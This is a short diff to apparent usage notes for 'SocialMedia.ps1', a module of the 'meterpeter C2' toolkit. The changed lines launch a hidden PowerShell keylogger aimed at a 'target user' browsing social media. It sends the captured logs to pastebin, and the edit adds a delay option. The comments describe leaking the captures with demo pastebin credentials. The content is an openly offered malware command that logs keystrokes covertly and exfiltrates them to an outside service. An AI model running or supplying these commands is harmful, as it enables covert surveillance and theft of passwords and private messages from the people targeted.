@@ -400,7 +400,7 @@ Start-Process -WindowStyle hidden powershell -argumentlist "-file SocialMedia.ps
 
 ## Start key`logger and send logfiles to pastebin everytime target user changes\exit from social media browser active tab
 # This example uses 'meterpeter C2' pastebin credentials as demo, but users can input your own pastebin account creds\APIkey
-Start-Process -WindowStyle hidden powershell -argumentlist "-file SocialMedia.ps1 -mode 'start' -force -sendtopastebin"
+Start-Process -WindowStyle hidden powershell -argumentlist "-file SocialMedia.ps1 -mode 'start' -delay '1400' -force -sendtopastebin"
 
 
 ## Hint: force 'SendToPasteBin' function to run before leaking any captures.
